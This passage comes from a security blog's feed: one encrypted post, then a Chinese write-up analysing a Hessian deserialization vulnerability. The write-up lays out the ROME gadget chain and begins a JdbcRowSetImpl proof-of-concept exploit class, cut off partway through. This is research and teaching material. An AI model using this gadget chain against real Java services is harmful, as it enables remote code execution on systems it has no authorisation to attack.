510da46e78c55d5af32d98a8e19e4dae1afe15712e92cd8cf92531893977caea94d7e9264a737aec670680c9240f01d2632daa1ec92f26cfce5fef9d1d460af1bf4eac3f055f6e2b69ab9d117be26471b6e279a74cebafe301140ceda41469d7c2ecbdad5978e7e3268e590fc23ff2ccd8f8964b471b40d49af8bf6a7e44a82fb06c88a2321469ed209fca86a543bf4ec02f91c0458079bfffeee9fd883886e0cf96b6075fc738d3b8dcb1b5bd13b0416258ba9f5e0f37697d93d941c0922cb2d9e34d2b72d741aad30b4f049fe25c96ae10dde6994cdc020d4980088b647314662d5d20f6fda3508cd4be7984dc9363bb617c4da7c825099fad2fba0f70e6afa3aa6df2e78d4a16a41420d568ced6a9beee055dcec4dc851b6726cfe01d44ac4b8ef63cbe864ff21bfb1d5fb698136667ab807d72078a5230d87aec27579c581f238d31528007597d3e3e13d8d8e6be49ab3e10392926af68723c845e46fbb4ad3cb2685ea2958690c41c6eab576aec466de07924273a8099a2ec36d9f2ce56950c9573e4ce62893222637f1c0f41ee60acb2f1da0cff38957cd47c344a06fc51c2ccf15b5d8b2f5765c9aaa2d0c46a52e8cb6fe219a0ed58da16ea3b5ea07352399026f02cdb01d493a1fa7284ed7fc6f70959347c93f55b2dfda12d4b46efea3ac96c18497b2959261e5a9ff72b910092871f57eb566aa32ab54c88a2f1e2f7cd1a6042a49c5fb2fbfa5f332588b9318986a5981b275edd73739bc0925f00899c7f8d1a419fb0855dbe86773c4dfb0949e0ac816d316a6760249b93d618efbb406c9a9c619d559193b336e6ee034889c96a7bd7a50e6fc3ef897e7f66e8397847a938cc17c94b5fc222bc77358903b91f6bd505730a20caa7be74d06f0ea6346a7b2375b91ec37904722938a1523d05aad0cd96f9fab129f8fd229832b35e75cd8b6bc971242d23f6ac0135ef7fa60ed6d1bb55e8d6950954c17ccde491d18b61bb557adb82e55d2d6e0e71356cfb89d444a1fb94bdedbd56780318a023c4826f35dd8b286d9612666492ae69befe675aeb905f1fa73acedce43f9b503399c0a5b48c320062965ff2a382e5a787bdcfa8c4067b43256c0fa66357780d2718285f2a8db6388b4c0b5c32ce7dbfe74a58177371bb71a605029077b82163108f921906aa7cd10e8b982af6e5b067f2df59e45486c6c69c7a9f42576992dee37e4f265c8d80c50193bfbe503709df15f254c19fb789cf6365dc1c080ee96e7616e74472c9ce3cdf67e5c99bdd7babc35f768c325449c514b45eac4ceda60deecf100d3ec8ab117be8d8f4de946066f4ed7bfff4bede12016ecc85127cb875c582a160926eba81c2dd032e1344c1f8db30887ceafbc663d7661e6cd78649926102b3be1b360875b2ce9a2381073979e2ebe7f2b51167d1fce21b84f2a91e18b8a836d592154cae0ccc1d4ca6f2e4ba93b56d6a5b8481c842041aca74c5b17f59f88e2b1e19df9537ed635f939e677987cbce99548dd9c2e5dd8191b388a2574169d97b9503ce059140a8f7a861424eef8857a26d6cc2a63145d7d7f4cd6244d3a5d60f4fe1cb559be2af8dbfdec9a63d3b4098d4c7aa8eef9af6da187afbd5b4b8baebefc4dd422c1fa7451bf4363c28f08b303bf5f5e3e6fd0a676ed0fb7db18800ca2c796a7708dbb5007ed53467b6e7310ebfffd8715f213a943852858942f93f92cf2d2a0d4ef92389b48f06abfb13d6d5b4207b08fbac47e96862e64a3b2d1fa849526591fa51dea8c0bb0ad5ab378364291163d3088bd2b725506a9ee4262e3ae2eda7893195503aa8a3806f7c6d5626162c7daa402abc859256e720ff59a98ea5472399a69b4059b25b20085a21643051ec62c6aefdd81d9d5889e4dbcaa0e47ca01f9a46c2c77cc04a45a03055848f4ac0fff6372b83ad2dd1f826c4f2074d2437a7fb355e4b56b30f9b3853aab4c0af5a189e005256241ee35fc60607700fd0f2d601c46f197b1785ad6aff20c8ff702b558560c04b735a676d664f4a7754ac075f9158cf00abbab95e778371e0dd43d5037639e6de79e9cd8d5362ffdf6c4bffb5258972416d64b4d0cca2d233ab8d89f8d79c06d51223b7da66e9d558832096201cc7384e090bd175a79d80ce47098a77e3d5cef02b8c474005624f3f339d92497f3994cd54e8a496c76dd1e2e2b10ac4e59f32c4f6d2960389ee8fde4fd5f3ffc0f2d2fca8088a4f4b7f503da2d60df74b7aa88e93b257c2a28f397bb002dd3d77ccb3652c3d376f137af8dd36114823325f7f30d4be4dd7b55239e4da496d0614fe6f3d01589cd7a86dedb288c70a609c90eff62d81cae4fbf276a52bf27f397c28286e6a86a187afed144391de095d949931e4e67b57c837d1c75fa99978a815f5606cedac5b3b397bd14188f4c343c8e99a301b344ee2b34e68c6a8c1821304062530fc67f1f188c1dbe2d238004a8c33e00efa1d6024c0845227806885f638ba33ebfd732f832a10f9214c4cc58f98ae137a4a4f59ca23653d1f8b26066882ac55ef5955144b31d6c443fa4363ff243632b3df0c09e045e7f8f2a420b170c905f8ed6880d03bce2fdbef4146a127a9058c186097b0f71741e348f7ee421d537e56ee6bf2172689721b7229ed9dfee0d752e71f55bb2403eac9ed43cc85a90aad6ba7f5dab455fc499554e8684ba7482c21f294ac0a65ae3fa1ce1803cfef34204fe16c0f932655a26793056d46656fb1cb2640f158341fdad8147e2f4cc961c853a375ea6e2141f6121e5490770f6c3b8b4b109e2c345f778befeeac26228b7c99aa72fa732e66d9b76b3b6ac5e9d08f82c57aaeb2416f7e18101b448d7626fab5146247100125e6585ce42056ba3d90eb56fca00e41acdee802d40a40012958d14ebe19fc56a599f5d089752fdb7f9bfe84db7fbe10b0c1344d5f901b7f6a8db5d47aa9b6287e382a4ee2eff50ea236be43a5f1d51f962d525d0dad592d6851018dd244636917ffc20ab77ac693be1d2c3355f1527acafafa824fb949d417161f112af88ef0263ede5833419c8894269912beaa7a87694d7437b82594d894305784baff14120e6a222acbdedc5b220877cbdec3e6953a5293611dbe76b3ea8ecdeb2497846fea9b3255f8e74dce27e5e09c07ced42631ba126ef89a3a39840ed3c62ef5db8699e64232d995fbf2ddf36bb62611508d7287bb9c5c57f3e495568eca69fed60573ffa617946ba5f3c330d27aba6526d8c73a3188fc2d265166ae52a25568db0c1d2b23cff6f51c21811350749741e544702f22b48a002d6b2e27a4eeaa782afcdfe7ac86fa0875a1cf8bb203f274d35368145905d2db16dea092c528815aa9e36596271c45a4b06c2893fc42c145f33fae2088f1a2d022aec306520fe5a05988ee8efe62de85324a54f19c4309e264af944282deded59ca20433f1b8521d9bfba55659e17ec3f280f7d5bc8fdd1bf5657974949c4b4b2849ef4cd3d241e487b36fc2a58a66fa278165cec819ac1a75893cad9d50b2488773e3b8a41239ca12699ddd3b770e4f2e332c7fb7e66403d49bd73a1e0f429e71d9e1320d639c87d229a0d6ae06a449573657fad140a34837554e45202b5c82a931b98f5cce54635f45f3006e6d658cbeb9525ac0c7a130dcf5f19b3348b4dbcc51920057c6436b61e05dafec882ec6afedfd6feed8df41d0cca1183a58f43ad06f40254978a406e16fe7a158f664b7816592926f9ff18d4564c9053d0e26506877d564753b2af621a97a66064d3cbdbb1b8107d08c6780944204d468c3c85815e9d66e5d75129bcba76ec0e82cb27c155fd0a05a392fab56bb4bda68303d667f2d4b397784f9c38c37d9d6cd828cb754a3179955dfd1011dff670d8cd98f80191bdd8adeec49a08fe727b3a8c9a537fbd0341aedd36ab890f460625ab60a9146172ecac0bc83d640ebf0eac5630e9cdfe2b3405ed515705f894765087ce87871f5f33026cd10eed435d125b2bac861f35e65d6a0f5838ecc54c498c154d2664b716d111116cf5533a5bede9cc93c9023be5fb7d55f6402661ce98de2d4cf14388298c73269fa5c8357b38fc01e2a11c5686911471a58a283e57ecc99cbd3a8b202bb0ab846064b2653ab24529853f08ad086593f9244b62832ff1919a7fa010bff018787bbbeb4b9b400d1ede80b755d3eb76b4cba0592965b67c9645c1148e0d86b4fba0438c3004a62f51a1ed460f3796ad6e9ff3309cca02fb24a85d99addf12cf5ef776f86d5c123a89a71088107ceaf73ccf00bf1ff6ac268a83feffceec513d657debc1ed8c2ae11636e06086ad59e96a078629dae2d5ad0570399b578952b9a95eeb792533ef767ac0b1941a327e45bb58d68d62d198b77cd09ff615c118aac4547964a9032ad58b4c4bd73099ce8c224d39be456fb3e19d3e79b23fbf7cfc83a3a9cb508040dabee087b1a61505c59c445a5c22bb2f60b10a2a7ca603593da7145f23822b6e3b1614733c83b22bc27376bcd615b7eb1c7a376dfc6b2b3e1ff4b3d8946c24f0b233c4d12ad9c1094ae1bf61a63e479cf0ff5eaed61fc31ff827d71b2ae55fa837b5d93e843dbedfe16a30ea0226f4051d4d3345a2cea86d8137fe8e244b5e65f7aef3bdb41c253140da12ef1643da82cb38278dad62a5b7d5e0d3740f28648b256bdacc3f2f3c2f13c5765a0c8e5c4842fa30a25b5af1a3490af67bfbe7cea54b272f6db79d5ac1a1700776f43bdc6ec10f9fce76dd7036c78d03bea60016dfac3064620a924cb23afc7e8d8907840a043078bb0f26817e2b3a02f64029d55069fbfb04dcdbd53d0c0ab9c4a98734e63d65ed0697348b3393d43b702a7c05cfd00bec12dfd2a626f42f42c333979ffc5f411272afd4c5c2e7a27097b57f099e16ea4586e224ed012a374f62d9f5a267dcc0607045d95c117f9a79fe1acc2948a0f52ce59e7cb0d8f67d74e8414f9e15243b4f61290765126dceeb37586b4e890fc159f9890f977e53f5cc58ec123ab68ee0f11298880a3a14175ecf55b332a234312374208d9711276ef4a444bc7ee1882449f1f35d69a3fb8f66746f08426e34daa94120284782f9bd01a344791453686a094bef5f95683a1be81db922c7d85c8312c2acb5174c975eddd3b720e87f2accd9d0e87c449945a7923d759536c172206cbda8ae6b4debc83f4975ad58084a438397e650e693daf12c57e25c71491e6c4f55ea0c6934bf02f8e87535b4bbfadc250c37c14c885849d16c32f014381b91c4310ba3e85f374e43ce586c1c7bc976020bf3ea9886723a8cc267c83b81110fe3bb61471d84c4a987966d349a3d317b70c21ee266ec6a405db270ae43f633e5bc2ae25d8157148b86f61a1a80d24fdeb265e87f2b3f52c1221aa27cfcbe0bbbcf8e4913020e71efc1a865d10b112da05abb859fbe3a002348bc91ebcaeed5e3630faa6243e45aaa32aaf382e4a167b062efeab9c5dd23006298a0c999eef7d9292fc2b9e9bfba2d09e8001e176d603a1eefdeceaac5631e12005f8c1185fccfab9fee95dc298dd2ec4bce3d302177522f9d06afe7085c44fe600cfdb6ff095d0d14288180c71c0591df485fc4b6572e997fe1784e71134c056312aa10b2967f950481e1ac108d90b3183caa068ea10b265325147fa1a348490fdaa98439456bf4dfae85d67c72ea56af076e632301d55029418151db422bf1e224c1169c1a54e0b467db5fecbfcb07bfa4be6c978b713d55a335690113c932661070921b345c298a4e7248a4f6b0848fafa2b711df7abc64e41bbee6cb507f52cf3494770bd8634e8518a34e581fa9ec8b3552fbe016465407649c8d56b0f2459ebe98baaf866f3a522e1e1cdc3028733e693320d487c49093675818b6e051e48ffc1be9cec708bd67dc666be3520f268bce26fe9b8d79e00f5489d5e05e18c15e5486e0ff4d637b2bb88e768eb57f0571d5c6a6cffadb84d128a99928cd452e47b54cc0f00cd72f406463274026fb51dca4e320ff116c46f1fbb83bc7ba9133e4d95f52ec415ae8f13af7eafdd50da83d40b5112197edd9aac0c2b100f3661125cec6c45f373180f224c286605320300199b09ca96992389337a4e9f1b073b69a88288039782cf09262fefd2f7f770a09e9e9ea0a3bd82c88f97d5a22f334b155e547314b8dce6c8ebdedf586bdccb05e8cc99cb2436eb2ebb69e289947d1238c4ad80be51447dcc41aa5351a3df249d5bb895bfaac961773fc6a8d39a6b102b16b3b1ebf6a448191f7792751fad649fe408e2ea22565baba6b7020e65458c1f9351681ea70ae7ec370ca7c398af0bba6e81fe1f6781e8495b65ff67c541e047bc2f666641deada1d2bef37ddd64b9149163fcdc483892ba504216f8fecde6e6b7366f4d174dc3d7b4cdd896e6af9e11453426078f1e91527eae4aedd30e29b23ef50e552707a250e1e919d7163634d1bbda20c14a972a1af254d69b7de562c94772ab12609f95d2ba04ec6e06252593389649189aad7dbe7970e1a33deddc4ae2f8970caca01c2a0765d865ca8c6965cbd51678b6e2009f76d2b4e95dd722286cf56163b39ae203faad3b4e2d514bc405e3da00136ba8ae43c57652b3e0f478ca388d0a8446b276304c4a283953d9ce98f5477b0d2b598c6bcdb0f60dca8cbee26a67cd905e2463e7d466fbbc0c0ee9db11fbb4c1246aa341e28b4ef03455e047ee583e66cf1bb0d8a06b8ec0f21325bc1c744c8472ac86aa754269650474fdee3f26168be81c5df6b91fc88be1f2bd8846bd09179ab81e55a2d06e504a26a444df94e1b6dfedcae3dc22749a397f34d132687ca44da54b77341ce552cb1df991af4078f30a73665cf6bea9003b4a0b14d3cc3d3b442e67da0f2107b20451debb927aa783fc5ac10781511d1b60b67c8711520251cd04741ab90762ef6d8202448bbd339a3d68ba426899a0155d2c1acdd1fb623682e5abcfe470c66d8aa685a2ccad3f005067fe9362e3aacc91636038e193557bf796808c035c136aa66b24251984dcf3533b0da3878bc53480eb2fb78a4c67523d2918437a851f579b239837012eb0a1e9ce893f06157e3cd17ca6932969293d2eb2b4adfb3c294df40f13b6a7a6d5de3375e0706945889caeb316ade05f8af0b5b0f1047776446823fc362d70984fbb8cb3686b53e71b071be7504d638b50efcfce17d19eb0d7cbcdc47747cfe76fb4c6941be7cd810af9d11db60264bc9b3eeaa5851b2e4afbdb2dbe43a5c6180dc1f896acefe971374849a3c6ea31b0d65d6fc36d1566bbff6b2982162945674472e1631644d3104ba10ea2a833aca1156ab96d7cb85e59af01ade012a3f7ccc92232c0b7ec118d379c23ba9720050aa033a21370a41f40110024b56ae7b1da0db14ec7364815e807cb3aae2ba982605b80b610196d117e7ec3a0b9dcab50ff241471a6938a2db82d970f4134cab4a948de15e12e7bf34fc0c2ab9f4622a2e557ef739ea7ebfbf38d909228f8ec02a5a65663c4b416294cb27fb5d5f8ccabae7709ab0083b24bdab4fbe7763b609cb7fdb1dc8f90b59dffcb2c645a7f7850224f7d1eabf4943884097b6ae4a446eed86cd93344980f8cf3fb112e366e94a0c43c9aa5023619f8c45a064a81c9defd5126cb28cd4540908fc6af8786a132324ca46f2e82c56bc63fbd7bcf637701c1341b66c9874597c01359c20dd185d7ea5816f1427c27f0323822a8957096c70a3997385d0921d73b5070fddf8b4a91432dbc2eddc0c8ceddf16305f2ec18a156ad1d347a6bcc6733f53358a923e5cfaa03750cb2e9ed2c54bf3c6aedbc6d24401171eab3dd9c4222d49264a93584584d5cd0cc33269c31e894c6aa484f89be8e09cbd68a39197dd2c2f7ed9c727dc51142a0a4b450089f19c0be2a5546c4c7f2f716f85018c030201c30210d22c590ed73ce978cb8144af1ff0f0a3c9098e33dcf3195d4d7097700f46aabb5cf0f927f9f75c526a53ba155fdc1405784b5aa93afb29920fce5ab883e417afe61a3cca2886a52bdce9cd746b1a5f5a98d314f9bb394c70de33dd32a6ad6a1e3928297bfe0361fe6da332f7da85767614eabaf3817e6de07c6ae607ab050f1d3a5c9779947ff91ea8b1cc35834a5b1228de6ca4ab93c471311d4227bae9b4b95a5c990cb507619916bf455e07f015efc06035266aacbbd7863b722aa3f9022f8e218f9bf68870864fb7c555a652b127d4b56af784884e9aa55020218efad3b0e1dcff85041e936812fe35a6c58907b496d25db89021f5806510c6464193cc93e0228e2cbd412a8012c10454491c31203a3dee2757706c03756d3562c60bf6fe969d281f5f73924e014babf1240fb114a4eb7737c4d535e5b4fa19ccda06ef861a3860fbdd8e3fb7c7e933906aa1814bd13abd9b514523c05d11c54b1f5749b26e3934916ea36f19277a2fe0632b2ccfcdc6dcef39bf7483aabc60a4f2825678b03021ffc4806a925128100802b547fc46f132706fdf4df8f2fab7cba99536af1e6b5eb67afa83f49c1d35f5236ac770d76271ad993cd91a5fea51a72bea16906f97adc9554146475d5c80fab3976153d98f635f961272ec460159623a987c6746f03932635faf2afaf0f8c4ae8a5b37b40741c3cf3be3544ff902cae80be341d812ac84d6909a02e47165598964d531f107fd34230ac717926078bc2e16ae8338d87a950538b77050d49c7bb8bd58eadc27d1f9b508ad0869a49467323e920c204655683cf36c3d750aa37b78f0cd005694d2baffa11784cb405fd572112d276000a4df9e6fe77b1b67e1c37cd115ee012e192ba971fa8d21774405f7715ade6b172ac6585cd1db2557148385722cb329544797ac1c34e745abaf7e85db13f352294d283877c39a3bdc6e92818f493e6d5a3268a5227a426acc280ee751f1980b454df84ed0ae51c58f70e60b6d3fbd92effb3f7a1aadcba19db2b837957dc402938494f0119dc4d6c4eeb919123c26ade59cc929eded2fc80090c550eaaa0b9ec4c89c05c1e9fe33982dd7e21907897b67d89c18f709405b5a307c494b7819b99d39a7053d5971ef1da0d08ddc63efff5c0441e23f973ed8a8c9e1540ed2dea2c3ae5249111e598fefecd9fe6c78560c855f4e55ddd22950c7f810a7b1d50c2ae6f1aac0594d44ed0920bbe6d5034c99a6c143ed8f3009999ea86f67f3e21b78775170827035c53b9e3f31dcfbcbd035623219eba007c19c42539cb31e4b19cf690492d0157483874ab163d564d99a0b23af861d38015afa259e8bf986aa1c370a30be64fe68b45449963c7f8c71f6ffa9f189a8e869617675d263265d1f45464e1d1552932d174e86b63390529db7256fae321f48567632c5cff8d3a3c6317b895d84ebe26cbc53cd1bee2527425f99631b350675a7ccfcf65fdf154ff5d946ab58679e8ef24740d4c66f28b43a28128a1835868fcb50c7a39727f9b4afe295af3da8944832708ae0e574463275a0c04dff46cbd5f6fe5bbae1177fbd9742a5e22876d33db98c0d680a2993f08fea186e80fff0019da87418550366f22b0159facc160c0a79d1cfb0cc6ebe6c7024343c445821799661894add7b05b2f2c0a978bee02ccec385e56364ee669cef804880c162425ab58e663239a4625b716fbc0d6f465744a77cb45d8fae497ed503176152511342268c50b966eb7008eb3235842ac965a4f87ff18cc6e093bf8f47c490bddf6934d2aaf47a0f4727a083533e8a51f249e218d7ea04c2c10d091ea423a362e940bb741f476af83c48cb7923376b7d8f8010839510aad4ea40357371b57adb9dc4a72e7c0be112c353e2d58a424470a03113c1b94533e53c65194b2a26a6913b832e6f33d561c249653c657efc376c88ba485827f071f1c01748fe25069e211fb0413717b7b1ceecb2dc265c351d706e6785cea7ace612dc409b71aab9e6a58a1d1085873380a15ef5f540980fdce8f110c92dbd0dbd2d752b2c971838ee2fb3aebb5cacdef6eab44d803be2b68bf495a34337cdd9ca9088349055579b28de3d219c8eaff763efb695ac0489fcecb784f8e280b98076f6aa63f494b4515751fbbe020add8ec3338e6a7c2874294852f413218e4bb5433eac1a1d81e9e8e3201e5c98d183b57752c82879d733954f841b4363c6f8dc62943e7b35ce57342d35793d72cbf0dc404ce2a7d278874ae85be92b5fc3b988ed4d3cfeb760637af17af304323e5ecb14209b3f8efd0b9cfd826544d25485696e1bd7213dc9af2e350f83453dfd1d24f4fbf12e2bcb1596c8551eff327b6105ee3d7b6df13c89abb3a95e2de35fbf36b16b021088fca68faea0504c351aa2628502062b1f6319c080461f52104f53332b200c07040eedc4b09914fb451cd8b7c37a89a97ff68ac8fbe6f507c882688b7c507124d94ba2e4b93e0fbc6095d1229ad42b0dd618e55aafb1fcadefbdbd2520f0d0d58af129a2e4ff94e955e5f77434b87dac739c9144aff59f56c8098fb1898dfa1dfb2f53273e021416903b01740ed79ba558c38c7e326750ec341fbdb5f5d994fd041052c0647bd3e888f17e664ce3088f7a4d9ce1b79ca87dbb89bd07e445e8e3679a4bf356de72e6f2840ee7f1ac0b6c0a360acd2f31242eb1ef9f5719e91afce4f3b4473eec407d5b285ced40d9c07c550cba77720bdb6f89d107302e883a83e0ffd52b4dce692a026cbd2c5482e06d2f5745222cb9f34e071725f527005f9b4e68bd2715f8d9e504a58cc17d82be83e4c4fe6d6c04ed58a8ddd072a0d9061662ae147442cdbc4bbdedd3fc97a347ee3cf3d0c0765a9088b0e3d43ede44b0fad988953039e379c9739f2a034bd1007063832e43e491854caedccd799f287cc02e562b90bd5ae028fcf9009d59aa49a3e5e96ce40f5fb2a469a7a2503e8e1aa5fcc3375cba4d0ac7d0f98e22418449c27208d7c6eaa4eae5bd81fc537ac9bc6bc4d3627de28167830bb8314ec5ff4a446384069f33b4c3f591e8d08b07514bf226be0fc7a4264bc29fc749006b9984a137f275876ab02ad37ce57b1548cabd9b8df86ba35e67ab7f951f25fb2bd9d8c8e29b0b715bde09470efa62817dbe63c3980f735de677e09e4187d951548198de8554cca60f0b2f33e345c569ae20c94106b529272ef4ca7d584c474124696bc18885e4fba151c9278069e55d88696faf0f4ef320259b0bdedbce4c0b34557b59f6814f2161e42e9faf93efb5a1db5bb72d8485bcd4a9fd697034afb33d72b64370989bd536e560d8e8506083ad30f6cb9b902b710c015f7f7dfb5f38f0057dd0b2ac1d8ee19518289449aeb0a256e674b0fbc7f46d85e03283ce8a0e6138933417e8e05005442b6997a5d54b95a860d2f532b18647f16eab275c64880a4815dbb4aab6b4bd24e156d930b4389b0b39f6777796976a0d5e53348a7d03744e307a78448a436bbd8ff8366fdb9c80b03ffe2c11afbada722e688bc2e36e8b240df983f30f2d183e7d11e881edb89f148e7cddb074dacd5d13f6882d0d3166655ee8b85b421d9b6bdd839af75b5d52270130c5e4b8bd98652223cb9a76c9a44122775d770faa159982715d37e99fc19e910</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-SSRF" scheme="https://ke1nys.github.io/tags/show-SSRF/"/>
    
  </entry>
  
  <entry>
    <title>java-Hessian</title>
    <link href="https://ke1nys.github.io/posts/8319cacd.html"/>
    <id>https://ke1nys.github.io/posts/8319cacd.html</id>
    <published>2023-06-25T06:40:33.000Z</published>
    <updated>2023-07-06T14:02:11.671Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://goodapple.top/archives/1193">文章1</a>    <a href="https://su18.org/post/hessian/#xbean">文章2</a>  <a href="https://juejin.cn/post/7130570567547093023">文章3  字节</a>    <a href="http://moonflower.fun/index.php/2022/05/28/336/">文章4</a></p><p>这里前言和简介就不写了  上面给的文章写的都很清楚了   直接看就行了</p><p>(<strong>就是prc啥的  直接看上面的文章就行了</strong>)</p><p>这里的只分析链子</p><h2 id="Hessian反序列化漏洞分析"><a href="#Hessian反序列化漏洞分析" class="headerlink" title="Hessian反序列化漏洞分析"></a>Hessian反序列化漏洞分析</h2><p>Hessian反序列化漏洞的关键出在<code>HessianInput#readObject</code>，由于Hessian会将序列化的结果处理成一个Map，所以序列化结果的第一个<code>byte</code>总为<code>M</code>（ASCII为77）。下面我们跟进<code>readObject()</code></p><p><code>HessianInput#readObject</code>部分代码如下</p><p><img src="../images/image-20230625153912111.png" alt="image-20230625153912111"></p><p>打个断点来进行分析</p><p><img src="../images/image-20230625153943252.png" alt="image-20230625153943252"></p><p>跟进这个<code>readMap</code>()方法</p><p><img src="../images/image-20230625154035372.png" alt="image-20230625154035372"></p><p>接着跟进这个<code>getDeserializer</code>()方法    获取反序列化的返回结果</p><p><img src="../images/image-20230625154203052.png" alt="image-20230625154203052"></p><p>在获取到<code>deserializer</code>后，java会创建一个HashMap作为缓存，并将我们需要反序列化的类作为<code>key</code>放入HashMap中。</p><p><strong>看过rome链子的应该能反应过来这里 </strong>    <code>hashmap</code>   <code>key</code></p><p>后续代码能够触发任意类的<code>hashcode()</code>方法</p><p><img src="../images/image-20230625160235189.png" alt="image-20230625160235189"></p><p>因为这个<code>key</code>可控</p><p>至此，我们Gadget的构造思路也就十分清晰了，只需要找一条入口为hashcode()的反序列化链即可，比如我们常用的ROME链</p><h3 id="Hessian-Rome"><a href="#Hessian-Rome" class="headerlink" title="Hessian+Rome"></a>Hessian+Rome</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">* TemplatesImpl.getOutputProperties()</span><br><span class="line">* ToStringBean.toString(String)</span><br><span class="line">* ToStringBean.toString()</span><br><span class="line">* ObjectBean.toString()</span><br><span class="line">* EqualsBean.beanHashCode()</span><br><span class="line">* ObjectBean.hashCode()</span><br><span class="line">* HashMap&lt;K,V&gt;.hash(Object)</span><br><span class="line">* HashMap&lt;K,V&gt;.readObject(ObjectInputStream)</span><br></pre></td></tr></table></figure><p><strong>利用链如下</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianInput;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.HessianOutput;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.EqualsBean;</span><br><span class="line"><span class="keyword">import</span> com.rometools.rome.feed.impl.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.sun.rowset.JdbcRowSetImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian_JNDI</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="type">byte</span>[] serialize(T o) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">HessianOutput</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianOutput</span>(bao);</span><br><span class="line">        output.writeObject(o);</span><br><span class="line">        System.out.println(bao.toString());</span><br><span class="line">        <span class="keyword">return</span> bao.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] bytes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bai</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(bai);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> input.readObject();</span><br><span class="line">        <span class="keyword">return</span> (T) o;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span 